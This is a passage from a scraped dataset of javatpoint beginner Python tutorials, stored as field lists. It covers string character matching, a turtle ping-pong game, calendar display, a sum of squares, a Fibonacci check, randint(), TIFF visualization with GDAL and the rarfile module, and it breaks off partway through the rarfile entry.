'(That is, the matching characters are: - x, w, 3, #)', ""string_1 = 'zyxwvwwv'"", ""string_1find('w') ? 3"", ""string_1find('v') ? 4"", ""string_1find('t') ? -1"", '# First, we will define the count function', 'def count_1(string_1, string_2):', 'count, find_1 = 0, 0', '# The loop will execute till the length of string_1 and it will', '# Stores the value of string_1 character by character and stores in ""store_1"" at every iteration.', 'for store_1 in string_1:', '', '# This will check if the extracted from of the characters of string_1', '# is present in string_2 or not.', 'if string_2.find(store_1) >= 0 and find_1 == string_1.find(store_1):', 'count += 1', 'find_1 += 1', ""print ('The no. matching characters in the pairs of strings: ', count)"", '# Main function', 'def main():', 'string_1 = str(input (""Please enter the characters for String 1: ""))', 'string_2 = str(input (""Please enter the characters for String 2: ""))', 'count_1(string_1, string_2) # At last, calling the count function', '# Driver Code', 'if __name__ == ""__main__"":', 'main()', '# First, we will define the count function', 'def count_1(string_1, string_2):', '# The set of characters of string_1', 'set_string_1 = set(string_1)', '# The set of characters of string2', 'set_string_2 = set(string_2)', '# We will use ""&"" intersection mathematical operation on the sets', '# the unique characters present in both the strings', '# will be stored in matched_characters_1 set variable', 'matched_characters_1 = set_string_1 & set_string_2', '#Then, we will print the length of matched_characters_1 set', '# which will give the number of matched characters in the pair of strings.', ""Print ('The number matching characters in the pairs of strings: ' + str (len (matched_characters_1)))"", '# Driver code', 'if __name__ == ""__main__"" :', 'string_1 = str(input (""Please enter the characters for String 1: ""))', 'string_2 = str(input (""Please enter the characters for String 2: ""))', 'count_1(string_1, string_2) # At last, calling the count function', 'import re', 'string_1 = str(input (""Please enter the characters for String 1: ""))', 'string_2 = str(input (""Please enter the characters for String 2: ""))', 'count = 0', 'for store_1 in string_1:', 'if re.search(store_1, string_2):', 'count = count + 1', ""print ('The number matching characters in the pairs of strings: ', count)""]","['Please enter the characters for String 1:  ajg 78y', 'Please enter the characters for String 2:  gjy 23r', 'The no. matching characters in the pairs of strings:  2', 'Please enter the characters for String 1:  awe ret #$65', 'Please enter the characters for String 2:  rty urw @!34', 'The number matching characters in the pairs of strings: 4', 'Please enter the characters for String 1: learning', 'Please enter the characters for String 2: working', 'The number matching characters in the pairs of strings: 5']",[],"['|||Step 1: we will initialize the counter variable with 0.|||Step 2: we will iterate over the first string from the first character to the last character.|||Step 3: If the character extracted from the string_1 is found in the string_2. And if the first occurrence index of that character in the string_1 is the same as that of the index of the current extracted character, then it will increase the value of the counter by 1.||||||Step 4: print the output value of the counter.||||||Step 1: In this method, we will use the set() function for removing the duplicate on the given strings.|||Step 2: We will use the set(intersection) on both strings.|||Step 3: We will use the len() function for calculating the length of the ""matched_characters_1"" string.||||||Step 1: We will import the Re module.|||Step 2: We will use the re.search() function to check if any character of string_1 is present in string_2 and if it does, then 1 will be added into the counter variable.|||']"
440,['Ping Pong Game Using Turtle in Python'],"['The ping pong game is one of the most famous games of arcadia, which is quite similar to table tennis. The rules of this game are simple:']","['https://www.javatpoint.com/python-function-to-display-clendar', 'https://www.javatpoint.com/python-program-to-count-number-of-matching-characters-in-a-pair-of-string', 'https://www.javatpoint.com/python-function-to-display-clendar', 'https://www.javatpoint.com/python-program-to-count-number-of-matching-characters-in-a-pair-of-string', 'https://www.javatpoint.com/python-function-to-display-clendar']","['https://static.javatpoint.com/python/images/ping-pong-game-using-turtle-in-python.png', 'https://static.javatpoint.com/python/images/ping-pong-game-using-turtle-in-python2.jpg']",[],['Conclusion'],"['Code 1: For Creating Illustrating the Ball and Paddle:', 'Code 2: The Complete Code for Illustrating the Ping Pong Game with Two Players.']",[],"['Players can strike back and forth on the ball by using the paddle.', 'The following are the steps used for illustrating Ping Pong game:', 'Explanation:', 'Explanation:']",['Turtle: The turtle is a built-in module in Python which is used for graphical illustrations. The users can use it as a pen and panel to illustrate the graphics.'],"['First, we imported the turtle library. Then we wrote the code for the background screen by using turtle.Screen() function. We created the Left and Right paddle by using the turtle.Turtle() function and positioned them by using goto() function. at last, we created the ball by using a turtle.Turtle() function and mentioned its moving speed on screen by using speed() function and other required parameters. The illustration of the ball and paddle on the screen is ready.', 'In the above code, after illustrating the outlook of the screen with paddles and ball, we will first initialize the score of both the players, that is, Zero. Then, we will display the score on the screen, which will increase with the opposite player missing the strike. We will then implement the functions for moving the paddle vertically. We will bind the keys for each function, that is, for ""Left Paddle"": ""R"" for ""Up"" and ""C"" for ""Down"", for ""Right Paddle"": ""Up key"" for ""Up"" and ""Down key"" for ""Down"". Then, we will initiate how the ball and striking of the paddle will work, as if the ball hit the paddle, it will go for the opposite player, but if the paddle missed the ball, then the ball will hit the border, and the opposite player will get the score. If the code is correct and no error is found, the screen of Ping Pong Game will pop up after running the code, and the players can play. The ball will first go for the right player.', 'In this tutorial, we have created a simple illustration of a ping pong game on the screen by using the built-in library of Python, that is, Turtle. The user can create different moving illustrations by using the turtle library and its different functions.']","['import os', 'import turtle', '# First, we will create screen', 'screen_1 = turtle.Screen()', 'screen_1.title(""Ping-Pong Game"")', 'screen_1.bgcolor(""Yellow"")', 'screen_1.setup(width = 1050, height = 650)', '# Left paddle', 'left_paddle = turtle.Turtle()', 'left_paddle.speed(0)', 'left_paddle.shape(""square"")', 'left_paddle.color(""Red"")', 'left_paddle.shapesize(stretch_wid = 6, stretch_len = 2)', 'left_paddle.penup()', 'left_paddle.goto(-400, 0)', '# Right paddle', 'right_paddle = turtle.Turtle()', 'right_paddle.speed(0)', 'right_paddle.shape(""square"")', 'right_paddle.color(""Blue"")', 'right_paddle.shapesize(stretch_wid = 6, stretch_len = 2)', 'right_paddle.penup()', 'right_paddle.goto(400, 0)', '# Ball of circle shape', 'hit_ball = turtle.Turtle()', 'hit_ball.speed(45)', 'hit_ball.shape(""circle"")', 'hit_ball.color(""White"")', 'hit_ball.penup()', 'hit_ball.goto(0, 0)', 'hit_ball.dx = 5', 'hit_ball.dy = -5', 'import os', 'import turtle', '# First, we will create screen', 'screen_1 = turtle.Screen()', 'screen_1.title(""Ping-Pong Game"")', 'screen_1.bgcolor(""Yellow"")', 'screen_1.setup(width = 1050, height = 650)', '# Left paddle', 'left_paddle = turtle.Turtle()', 'left_paddle.speed(0)', 'left_paddle.shape(""square"")', 'left_paddle.color(""Red"")', 'left_paddle.shapesize(stretch_wid = 6, stretch_len = 2)', 'left_paddle.penup()', 'left_paddle.goto(-400, 0)', '# Right paddle', 'right_paddle = turtle.Turtle()', 'right_paddle.speed(0)', 'right_paddle.shape(""square"")', 'right_paddle.color(""Blue"")', 'right_paddle.shapesize(stretch_wid = 6, stretch_len = 2)', 'right_paddle.penup()', 'right_paddle.goto(400, 0)', '# Ball of circle shape', 'hit_ball = turtle.Turtle()', 'hit_ball.speed(45)', 'hit_ball.shape(""circle"")', 'hit_ball.color(""Black"")', 'hit_ball.penup()', 'hit_ball.goto(0, 0)', 'hit_ball.dx = 5', 'hit_ball.dy = -5', '# Now, we will initialize the score', 'left_player = 0', 'right_player = 0', '# Displaying of the score', 'sketch_1 = turtle.Turtle()', 'sketch_1.speed(0)', 'sketch_1.color(""blue"")', 'sketch_1.penup()', 'sketch_1.hideturtle()', 'sketch_1.goto(0, 260)', 'sketch_1.write(""Left Player : 0    Right Player: 0"",', 'align = ""center"", font = (""Courier"", 24, ""normal""))', '# Implementing the functions for moving paddle vertically', 'def paddle_L_up():', 'y = left_paddle.ycor()', 'y += 20', 'left_paddle.sety(y)', 'def paddle_L_down():', 'y = left_paddle.ycor()', 'y -= 20', 'left_paddle.sety(y)', 'def paddle_R_up():', 'y = right_paddle.ycor()', 'y += 20', 'right_paddle.sety(y)', 'def paddle_R_down():', 'y = right_paddle.ycor()', 'y -= 20', 'right_paddle.sety(y)', '# Then, binding the keys for moving the paddles up and down.', 'screen_1.listen()', 'screen_1.onkeypress(paddle_L_up, ""r"")', 'screen_1.onkeypress(paddle_L_down, ""c"")', 'screen_1.onkeypress(paddle_R_up, ""Up"")', 'screen_1.onkeypress(paddle_R_down, ""Down"")', 'while True:', 'screen_1.update()', 'hit_ball.setx(hit_ball.xcor() + hit_ball.dx)', 'hit_ball.sety(hit_ball.ycor() + hit_ball.dy)', '# Check all the borders', 'if hit_ball.ycor() > 280:', 'hit_ball.sety(280)', 'hit_ball.dy *= -1', 'if hit_ball.ycor() < -280:', 'hit_ball.sety(-280)', 'hit_ball.dy *= -1', 'if hit_ball.xcor() > 500:', 'hit_ball.goto(0, 0)', 'hit_ball.dy *= -1', 'left_player += 1', 'sketch_1.clear()', 'sketch_1.write(""Left_player : {}    Right_player: {}"".format(', 'left_player, right_player), align = ""center"",', 'font = (""Courier"", 24, ""normal""))', 'if hit_ball.xcor() < -500:', 'hit_ball.goto(0, 0)', 'hit_ball.dy *= -1', 'right_player += 1', 'sketch_1.clear()', 'sketch_1.write(""Left_player : {}    Right_player: {}"".format(', 'left_player, right_player), align = ""center"",', 'font = (""Courier"", 24, ""normal""))', '# Collision of ball and paddles', 'if (hit_ball.xcor() > 360 and', 'hit_ball.xcor() < 370) and (hit_ball.ycor() < right_paddle.ycor() + 40 and', 'hit_ball.ycor() > right_paddle.ycor() - 40):', 'hit_ball.setx(360)', 'hit_ball.dx *= -1', '', 'if (hit_ball.xcor() < -360 and', 'hit_ball.xcor() > -370) and (hit_ball.ycor() < left_paddle.ycor() + 40 and', 'hit_ball.ycor() > left_paddle.ycor() - 40):', 'hit_ball.setx(-360)', 'hit_ball.dx *= -1']",[],[],"['|||There are two players.|||Both have control over the paddle of their side.|||They can move the paddle on vertical sides from up to down and down to up.||||||Step 1: The user has to create two Paddles for the ""Left Side"" and ""Right Side"" of the screen.|||Step 2: The user then has to create the ball.|||Step 3: Then, create an event for moving the paddles vertically by pressing the particular keys, that is, for ""Left Paddle"": ""R"" for ""Up"" and ""C"" for ""Down"", for ""Right Paddle"": ""Up key ()"" for ""Up"" and ""Down key ()"" for ""Down"".|||Step 4: At last, create the function for updating the score after each player misses the strike on the ball.|||']"
441,['Python Function to Display Calendar'],"['In this tutorial, we will learn how to display the calendar of any month of any year using Python.']","['https://www.javatpoint.com/python-program-for-calculating-sum-of-squares-of-first-n-natural-numbers', 'https://www.javatpoint.com/ping-pong-game-using-turtle-in-python', 'https://www.javatpoint.com/python-program-for-calculating-sum-of-squares-of-first-n-natural-numbers', 'https://www.javatpoint.com/ping-pong-game-using-turtle-in-python', 'https://www.javatpoint.com/python-program-for-calculating-sum-of-squares-of-first-n-natural-numbers']",[],[],['Conclusion'],[],[],"['In this tutorial, we have discussed how a user can display the calendar in Python.']","['In the code below, we will import the ""calendar"" module. It has an inbuilt ""month()"" function, which takes the year and month of which the user wants to display the calendar.']",[],"['import calendar', 'year = int(input (""Please enter the Year: "")) # Here, it will take the year', 'month = int(input (""Please enter the month: ""))    # Here, it will take the month', '# Now, we will display the calendar', 'Print (""The Calendar of: "", calendar.month(year, month))']","['Please enter the Year:  1919', 'Please enter the month:  01', 'The Calendar of:      January 1919', 'Mo Tu We Th Fr Sa Su', '1     2    3  4  5', '6     7   8      9 10 11 12', '13 14 15 16 17 18 19', '20 21 22 23 24 25 26', '27 28 29 30 31', 'Please enter the Year:  2022', 'Please enter the month:  10', 'The Calendar of:      October 2022', 'Mo Tu We Th Fr Sa Su', '1  2', '3    4    5     6    7  8  9', '10 11 12 13 14 15 16', '17 18 19 20 21 22 23', '24 25 26 27 28 29 30', '31']",[],[]
442,['Python Program for Calculating the Sum of Squares of First n Natural Numbers'],"['In this tutorial, we will learn how to calculate the sum of squares of first n natural numbers using Python.']","['https://www.javatpoint.com/python-program-for-how-to-check-if-a-given-number-is-fibonacci-number-or-not', 'https://www.javatpoint.com/python-function-to-display-clendar', 'https://www.javatpoint.com/python-program-for-how-to-check-if-a-given-number-is-fibonacci-number-or-not', 'https://www.javatpoint.com/python-function-to-display-clendar', 'https://www.javatpoint.com/python-program-for-how-to-check-if-a-given-number-is-fibonacci-number-or-not']",[],[],['Conclusion'],['How to Avoid Early Overflow:'],[],"['We have a positive integer ""N"", and our task is to calculate (12 + 22 + 32 + 42 + 52 +… + N2)', 'Method 1: O(N)', 'Method 2: O(1)', 'In this method, the user can calculate the sum of the square of the first ""N"" natural numbers by using the following formula:', 'For Example:']","['In this method, a user has to run the loop from 1 to ""N"" natural number, and for each K, 1 <= K <= N. The user has to find the K2 to calculate the sum.', 'For the large ""NN"" natural number, the value of [(NN * (NN + 1) * (2 * NN + 1)) / 6] would probably overflow. The users can avoid this situation by using the fact that (NN * (NN + 1)) must be divisible by 2.', 'In this tutorial, we have explained two methods for calculating the sum of squares of ""N"" natural numbers using python and avoiding the code\'s overflow.']",[],"['Input: N = 6', 'Output: 91', '12 + 22 + 32 + 42 + 52 + 62', '= 1 + 4 + 9 + 16 + 25 +36', 'Input:  N = 2', 'Output: 5', '12 + 22', '= 1 + 4', '# First, we will create a function', '# which will return the sum of', '# squares of first ""NN""', '# natural numbers', 'def square_sum(NN) :', '# here, we will iterate K from 1', '# and NN for finding', '# the square numbers from K to NN and', '# then add to sum.', 'sum_1 = 0', 'for K in range(1, NN + 1) :', 'sum_1 = sum_1 + (K * K)', 'return sum_1', '# Driven Program', 'NN = int (input (""Please enter the \'N\' natural number: ""))', 'print (square_sum(NN)', '(NN * (NN + 1) * (2 * NN + 1)) / 6', 'For NN = 6, sum_1 = (6 * (6 + 1) * (2 * 6 + 1)) / 6', '= (6 * (7) * (13)) / 6', '= (546) / 6', '= 91', 'For NN = 56, sum_1 = (56 * (56 + 1) * (2 * 56 + 1)) / 6', '= (56 * (57) * (113)) / 6', '= (3,60,696) / 6', '= 60116', '# First, we will create a function', '# which will return the sum of', '# squares of first ""NN""', '# natural numbers', 'def square_sum(NN) :', 'return (NN * (NN + 1) * (2 * NN + 1)) // 6', '# Driven Program', 'NN = int( input(""Please enter the \'N\' natural number: ""))', 'print (square_sum(NN))', '# First, we will create a function', '# which will return the sum of', '# squares of first ""NN""', '# natural numbers', 'def square_sum(NN):', 'return (NN * (NN + 1) * (2 * NN + 1)) // 3', '# Driven Program', 'NN = int( input(""Please enter the \'N\' natural number: ""))', 'print (square_sum(NN))']","[""Please enter the 'N' natural number:  56"", '60116', ""Please enter the 'N' natural number:  87"", '223300', ""Please enter the 'N' natural number:  567"", '121844520']",[],[]
443,['Python Program for How to Check if a Given Number is Fibonacci Number or Not'],"['In this tutorial, we will learn how to check if the given number is a Fibonacci number or not.']","['https://www.javatpoint.com/randint-function-in-python', 'https://www.javatpoint.com/python-program-for-calculating-sum-of-squares-of-first-n-natural-numbers', 'https://www.javatpoint.com/randint-function-in-python', 'https://www.javatpoint.com/python-program-for-calculating-sum-of-squares-of-first-n-natural-numbers', 'https://www.javatpoint.com/randint-function-in-python']",[],[],['Conclusion'],['Python Program to Check if Given Number if Fibonacci or Not:'],[],"['We can also use the following property of the Fibonacci number for checking if the given number is a Fibonacci number or not:', 'In this tutorial, we have discussed how a user can check if the given number is a Fibonacci number or not by using Python.']","['Here, we have a number ""n"", and we have to check if it is a Fibonacci number. Starting number of Fibonacci series are: 0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, and so on.']",[],"['Input number: 5', 'Output: Yes, the given number is a Fibonacci_Number.', 'Input number:  22', 'Output: No, the given number is not a Fibonacci_Number.', 'Input number: 55', 'Output: Yes, the given number is a Fibonacci_Number.', 'import math as m', '# Here, we will create a utility function that will return true if K is a perfect square', 'def is_Perfect_Square(K):', 's = int(m.sqrt(K))', 'return s * s == K', '# Now, we will create a function which will return ""true"" if R is a Fibinacci Number,', '# else it will return ""false""', 'def is_Fibonacci(R):', '# R is a Fibinacci number only if one of (5 * R * R + 4) or (5 * R * R - 4) or both', '# of them are perferct square', 'return is_Perfect_Square(5 * R * R + 4) or is_Perfect_Square(5 * R * R - 4)', '# Now, we will create a utility function for testing the above functions', 'for J in range(1, 22):', 'if (is_Fibonacci(J) == True):', 'print (""Number:"", J, "": Yes, the given number is a Fibonacci_Number"")', 'else:', 'print (""Number:"", J, "": No, the given number is not a Fibonacci_Number"")']","['Number: 1 : Yes, the given number is a Fibonacci_Number', 'Number: 2 : Yes, the given number is a Fibonacci_Number', 'Number: 3 : Yes, the given number is a Fibonacci_Number', 'Number: 4 : No, the given number is not a Fibonacci_Number', 'Number: 5 : Yes, the given number is a Fibonacci_Number', 'Number: 6 : No, the given number is not a Fibonacci_Number', 'Number: 7 : No, the given number is not a Fibonacci_Number', 'Number: 8 : Yes, the given number is a Fibonacci_Number', 'Number: 9 : No, the given number is not a Fibonacci_Number', 'Number: 10 : No, the given number is not a Fibonacci_Number', 'Number: 11 : No, the given number is not a Fibonacci_Number', 'Number: 12 : No, the given number is not a Fibonacci_Number', 'Number: 13 : Yes, the given number is a Fibonacci_Number', 'Number: 14 : No, the given number is not a Fibonacci_Number', 'Number: 15 : No, the given number is not a Fibonacci_Number', 'Number: 16 : No, the given number is not a Fibonacci_Number', 'Number: 17 : No, the given number is not a Fibonacci_Number', 'Number: 18 : No, the given number is not a Fibonacci_Number', 'Number: 19 : No, the given number is not a Fibonacci_Number', 'Number: 20 : No, the given number is not a Fibonacci_Number', 'Number: 21 : Yes, the given number is a Fibonacci_Number']",[],['|||A number is Fibonacci number only if one of (5 * R * R + 4) or ( 5 * R * R - 4) or both of them are the perfect square.|||']
444,['The randint() Function in Python'],"['In this tutorial, we will learn about the ""randint()"" function in Python.']","['https://www.javatpoint.com/visualize-tiff-file-using-matplotlib-and-gdal-in-python', 'https://www.javatpoint.com/python-program-for-how-to-check-if-a-given-number-is-fibonacci-number-or-not', 'https://www.javatpoint.com/visualize-tiff-file-using-matplotlib-and-gdal-in-python', 'https://www.javatpoint.com/python-program-for-how-to-check-if-a-given-number-is-fibonacci-number-or-not', 'https://www.javatpoint.com/visualize-tiff-file-using-matplotlib-and-gdal-in-python']",[],[],"['Applications:', 'Conclusion']","['Syntax:', 'Parameters:', 'Parameters:', 'Errors and Exceptions:', 'Example 1:', 'Example 2:', 'Example 3:']",[],"['First, we have to import the random module in Python to use the randint() function. This function is basically used for creating pseudo-randomness.', '(start_range, end_range): Both the parameters must be integer type values.', 'It will return the random integer in the range [start_range, end_range], including both starting and ending numbers. ', 'ValueError: Returns a ValueError when the user passes floating point as parameters.', 'TypeError: Returns a TypeError when the user passes anything other than integer value as parameters.', 'To get the random number between the given range of two positive numbers, two negative numbers, and one positive and one negative number.', 'In this example, we will see how the users can get the ValueError in the Python program while using the randint() function.', 'In this example, we will see how the user can get the TypeError in Python while using the randint() function.', 'The users can use the randint() function for simulating a lucky draw game.', 'Example: code for application']","['The ""randint()"" is a built-in function of the random module in Python. The random module is used for getting access to various functions like generating random numbers by using the randint() function.', 'Suppose we have participated in a lucky draw game such as ""Casino Game"". The player will get three chances to guess the number between 1 to 36. If we have guessed the number correctly, we will win, else we will lose the game.']","[""In this tutorial, we have discussed the randint() function of Python's random module. We have shown the types of errors the user can get while using the randint() function. We have also discussed how the randint() function is used for creating an application of lucky draw games.""]","['randint(start_range, end_range)', 'import random as rnd', '# First, we will generate the random number between any positive number range', 'random_1 = rnd.randint(55, 75)', 'print (""The any random number between 55 and 75 is % s"" % (random_1))', '# Then, we will generate the random number between two given negative number range', 'random_2 = rnd.randint(-40, -20)', 'print (""The any random number between -40 and -20 is % s"" % (random_2))', '# We will now, generate the random number between a positive number and a negative number range', 'random_3 = rnd.randint(-20, 20)', 'print (""The any random number between -20 and 20 is % s"" % (random_3))', '# First, we will import the random module', 'import random as rnd', '# If the user passes any floating point values as the parameters in the randint() # function.', 'random_1 = rnd.randint(2.543, 12.786)', 'print (random_1)', '# First, we will import the random module', 'import random as rnd', '# If the user passes any string or character value as the parameters in the', '# randint() function', ""random_2 = rnd.randint('String', 'Character')"", 'print (random_2)', '# First, we will import the randint function', '# from the random module in Python', 'from random import randint as rdt', '# We will create a function which can generate a new', '# random number everytime the code will execute', 'def generator_1():', 'return rdt(1, 36)', '# Now, we will create a function which takes the input from the user and returns', '# true or false depending whether the', '# user has guessed the correct number and wins the lucky draw or not.', 'def random_guess():', '# The calls generator_1() which returns a', '# random integer between 1 and 36', 'random_number_1 = generator_1()', '# here, we will define the number of', '# guesses the user will get', 'guess_left_1 = 3', '# now, we will set the flag variable for checking', '# the win-condition for the user', 'flag_1 = 0', '# Then, we will loop the number of times', '# the user will get the chances', 'while guess_left_1 > 0:', '# Here, we will take a input from the user.', 'guess_1 = int (input (""Please select your number to ""', '""enter the lucky draw game \\n""))', '# then, we will check whether the guess of the user', '# matched the generated win-condition or not.', 'if guess_1 == random_number_1:', '# Then, we will set the flag as 1 if the user have guessed', '# the correct number and then loop will broke', 'flag_1 = 1', 'break', '', 'else:', '', '# If the guess of the user does not matched', '# the win-condition then it will print', 'print (""You have guessed Wrong Number!!"")', '# then, we will decrease the number of', '# guesses left by 1', 'guess_left_1 -= 1', '# If the condition of winning is satisfied then,', '# the function random_guess will return ""True""', 'if flag_1 == 1:', 'return True', '# Otherwise, the function will return ""False""', 'else:', 'return False', '# Driver code', ""if __name__ == '__main__':"", 'if random_guess() == True:', 'print (""Congratulation!! You have Won the game."")', 'else :', 'print (""Sorry, You have Lost the game!"")']","['The any random number between 55 and 75 is 74', 'The any random number between -40 and -20 is -40', 'The any random number between -20 and 20 is -12', 'The any random number between 55 and 75 is 74', 'The any random number between -40 and -20 is -29', 'The any random number between -20 and 20 is -2', '---------------------------------------------------------------------------', 'ValueError                                Traceback (most recent call last)', 'in', '4 # If the user passes any floating point values as the parameters in the randint() function.', '5', '----> 6 random_1 = rnd.randint(2.543, 12.786)', '7 print(random_1)', 'c:\\users\\User Name\\appdata\\local\\programs\\python\\python39\\lib\\random.py in randint(self, a, b)', '336         """"""', '337', '--> 338         return self.randrange(a, b+1)', '339', '340', 'c:\\users\\user name\\appdata\\local\\programs\\python\\python39\\lib\\random.py in randrange(self, start, stop, step)', '300         istart = int(start)', '301         if istart != start:', '--> 302             raise ValueError(""non-integer arg 1 for randrange()"")', '303         if stop is None:', '304             if istart > 0:', 'ValueError: non-integer arg 1 for randrange()', '---------------------------------------------------------------------------', 'TypeError                                 Traceback (most recent call last)', 'in', '4 # If the user passes any string or character value as the parameters in the randint() function', '5', ""----> 6 random_2 = rnd.randint('String', 'Character')"", '7 print (random_2)', 'c:\\users\\user name\\appdata\\local\\programs\\python\\python39\\lib\\random.py in randint(self, a, b)', '336         """"""', '337', '--> 338         return self.randrange(a, b+1)', '339', '340', 'TypeError: can only concatenate str (not ""int"") to str', 'Please select your number to enter the lucky draw game', '3', 'You have guessed Wrong Number!!', 'Please select your number to enter the lucky draw game', '2', 'You have guessed Wrong Number!!', 'Please select your number to enter the lucky draw game', '34', 'You have guessed Wrong Number!!', 'Sorry, you have Lost the game!', 'Please select your number to enter the lucky draw game', '14', 'You have guessed Wrong Number!!', 'Please select your number to enter the lucky draw game', '12', 'You have guessed Wrong Number!!', 'Please select your number to enter the lucky draw game', '3', 'Congratulation!! You have Won the game.']",[],[]
445,['Visualize Tiff File using Matplotlib and GDAL in Python'],"['The file format TIFF is utilized for the storage of images that are rasterized. A library named GDAL Geospatial Data Abstraction Library is specifically designed to read these raster files, as well as other file formats, such as vector formats. The gdal library is part of the Open-Source Geospatial Foundation.']","['https://www.javatpoint.com/rarfile-module-in-python', 'https://www.javatpoint.com/randint-function-in-python', 'https://www.javatpoint.com/rarfile-module-in-python', 'https://www.javatpoint.com/randint-function-in-python', 'https://www.javatpoint.com/rarfile-module-in-python']","['https://static.javatpoint.com/python/images/visualize-tiff-file-using-matplotlib-and-gdal-in-python.png', 'https://static.javatpoint.com/python/images/visualize-tiff-file-using-matplotlib-and-gdal-in-python2.png']",[],['Conclusion'],"['Approach:', 'Step-by-step Implementation:']",[],"['To install required modules, we can use following commands in our terminal:', 'We require matplotlib and GDAL modules within Python to display a tiff image.', 'To explain this tutorial, we will be using the following image in tiff format:', 'Step 1: Importing the modules and opening the file.', 'Step 2: Counting the total number of bands.', 'Step 3: Fetching the bands', 'Step 4: Reading the bands as NumPy arrays.', 'GDAL offers the ReadAsArray() method to convert those bands in NumPy arrays and returns the arrays.', 'Step 5: Plotting the arrays using imshow() function of matplotlib.', ""For plotting the three arrays, we'll stack them up in order."", 'Final code:', 'Final Output:', 'In this tutorial, we have discussed how we can visualize tiff file format images by using matplotlib and glad modules in Python.']","[""We utilize the GDAL's GetRasterBand(int) to get the bands. It is important to note that the value that we pass will always begin with one (indexing of bands starts at 1)""]",[],"['pip install gdal', '!pip3 intall matplotlib', 'from osgeo import gdal as GD', 'import matplotlib.pyplot as mplot', 'import numpy as npy', ""data_set = GD.Open(r'land_shallow_topo_2048.tif')"", 'print(data_set.RasterCount)', '# As, there are 3 bands, We will store in 3 different variables', 'band_1 = data_set.GetRasterBand(1) # red channel', 'band_2 = data_set.GetRasterBand(2) # green channel', 'band_3 = data_set.GetRasterBand(3) # blue channel', 'b1 = band_1.ReadAsArray()', 'b2 = band_2.ReadAsArray()', 'b3 = band_3.ReadAsArray()', 'img_1 = npy.dstack((b1, b2, b3))', 'f = mplot.figure()', 'plt.imshow(img_1)', ""mplot.savefig('Tiff.png')"", 'mplot.show()', 'from osgeo import gdal as GD', 'import matplotlib.pyplot as mplot', 'import numpy as npy', ""data_set = GD.Open(r'land_shallow_topo_2048.tif')"", 'print(data_set.RasterCount)', '# As, there are 3 bands, we will store in 3 different variables', 'band_1 = data_set.GetRasterBand(1) # red channel', 'band_2 = data_set.GetRasterBand(2) # green channel', 'band_3 = data_set.GetRasterBand(3) # blue channel', 'b1 = band_1.ReadAsArray()', 'b2 = band_2.ReadAsArray()', 'b3 = band_3.ReadAsArray()', 'img_1 = npy.dstack((b1, b2, b3))', 'f = mplot.figure()', 'plt.imshow(img_1)', ""mplot.savefig('Tiff.png')"", 'mplot.show()']",['3'],[],['|||Step 1: Import the module|||Step 2: We can count how many bands.|||Step 3: Find every raster band in the TIFF file.|||Step 4: The bands are read to NumPy arrays.|||Step 5: In the imshow() function of Matplotlib to display.|||']
446,['rarfile module in Python'],"['In the following tutorial, we will discuss the rarfile module of the Python programming language. We will understand the different classes of the rarfile module along with some examples.']","['https://www.javatpoint.com/stemming-words-using-python', 'https://www.javatpoint.com/visualize-tiff-file-using-matplotlib-and-gdal-in-python', 'https://www.javatpoint.com/stemming-words-using-python', 'https://www.javatpoint.com/visualize-tiff-file-using-matplotlib-and-gdal-in-python', 'https://www.javatpoint.com/stemming-words-using-python']",[],[],"['Understanding the Python rarfile module', 'How to install the rarfile module in Python?', 'Classes of the rarfile module', 'Functions of the rarfile module', 'Constants of the rarfile module', 'Warnings and Exceptions of the rarfile module', 'Working of the rarfile module']","['Understanding the RarFile class', 'Understanding the RarInfo class', 'Understanding the RarExtFile class', 'Understanding the nsdatetime class']",[],"[""So, let's get started."", 'The rarfile module in Python is used to read the RAR archive. The interface is built as zipfile-like as possible.', 'The basic functionalities of the rarfile module:', 'Now, before we start working with the module, let us install it.', 'In order to install the rarfile module, we will be using the pip installer following the command shown below:', 'In order to verify the module is installed properly, we can create a new file and add the import statement to see if it returns any errors or not.', 'File: verify.py', 'Now, save the Python file and run the execution command using the command prompt:', 'Now, let us understand the basics of the rarfile module.', 'The rarfile module provides multiple classes that we can use as per the requirements. These classes are:', 'We will discuss these classes in brief.', 'The RarFile class of the rarfile module is used to parse the RAR structure, providing access to the files in the archive.', 'The syntax of the execution of the RarFile class is shown below:', 'Some of the methods and attributes of the RarFile class is shown below:', '1. comment= None', 'This attribute is used to state the archive comment. The value can either be a Unicode string or None.', '2. filename= None', 'This attribute is used the provide the name of the file, if available. The value can either be a Unicode string or None.', '3. __enter__()', 'This method is used to open context.', '4. __exit__(type, value, traceback)', 'This method is used to exit context.', '5. __iter__()', 'This method is used to iterate over members.', '6. setpassword(pwd)', 'This method is used to set the password used during extraction.', '7. needs_password()', 'This method returns True in case any archive entries need a password for extraction.', '8. namelist()', 'This method returns a list containing the names of the file in the archive.', '9. infolist()', 'This method returns the RarInfo objects for all files/directories in the archive.', '10. volumelist()', 'This method returns the filenames of the archive volumes.', 'If the archive is of only a single volume, the list consists of the name of the main archive file.', '11. getinfo(name)', 'This method returns RarInfo for file.', ""12. open(name, mode = 'r', pwd = None)"", 'This method returns the file-like object (RarExtFile) from where the data can be read.', 'The object implements io.RawIOBase interface, so we can further wrap it with io.BufferReader and io.TextIOWrapper.', 'In the previous versions of Python, where the io module is not available, it implements only read(), seek(), tell(), and close() methods.', 'Parameters:', '13. read(name, pwd = None)', 'This method returns the uncompressed data for archive entry.', 'It is recommended to use the open() method for larger files.', 'Parameters:', '14. close()', 'This method is used to release open resources.', '15. printdir(file = None)', 'This method is used to print a list of the files in the archive to stdout or a given file.', '16. extract(member, path = None, pwd = None)', 'This method is used to extract a single file into the current directory.', 'Parameters:', '17. extractall(path = None, members = None, pwd = None)', 'This method is used to extract all files into the current directory.', 'Parameters:', '18. testrar(pwd = None)', 'This method is used to read all files and test CRC.', '19. strerror()', 'This method returns an error string if parsing fails or None if no exception has occurred.', 'The RarInfo class of the rarfile module is used as an entry in the RAR archive.', 'Timestamps as datetime are without time zone in RAR3, with UTC zone in RAR5 archives', 'The syntax of the execution of the RarInfo class is shown below:', 'Some of the methods and attributes of the RarInfo class is shown below:', '1. filename', '2. date_time', '3. comment', 'This attribute includes the optional file comment field. The value consists of a Unicode string. (RAR3-only)', '4. file_size', 'This attribute is used to specify the uncompressed size.', '5. compress_size', 'This attribute is used to specify the compressed size.', '6. compress_type', 'This attribute is used to specify the method of the compression: One of the RAR_M0, …, RAR_M5 constants.', '7. extract_version', 'This attribute consists of the minimal version of RAR that is required for decompression. As (major*10 + minor), so 2.9 is 29.', 'RAR3: 10, 20, 29', 'RAR5 does not have such a field in the archive, and it is set to 50.', '8. host_os', 'This attribute specifies the Host OS type, one of RAR_OS_* constants.', 